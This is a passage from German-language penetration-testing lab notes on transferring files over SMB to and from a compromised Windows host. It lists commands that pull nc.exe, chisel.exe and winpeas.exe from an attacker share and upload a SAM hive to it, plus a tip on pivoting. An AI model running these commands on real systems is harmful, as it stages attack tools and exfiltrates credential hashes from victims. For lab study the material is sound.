...
# Auf Target
copy \\$LHOST\share\nc.exe .
copy \\192.168.1.162\share\chisel.exe C:\Windows\Temp\chisel.exe
\\$LHOST\share\winpeas.exe                                            # direkt ausführen
# Upload zum Angreifer:
copy C:\loot\sam.hive \\$LHOST\share\
```

> **Lab-Tipp:** SMB-Copy von einem Kali-`impacket-smbserver` ist der
> zuverlässigste Weg, eine `chisel.exe`/`nc.exe` auf einen Windows-Pivot
> (z.B. VM6) zu bekommen. Siehe [Pivoting](../04-Post-Exploitation/Pivoting/README.md).
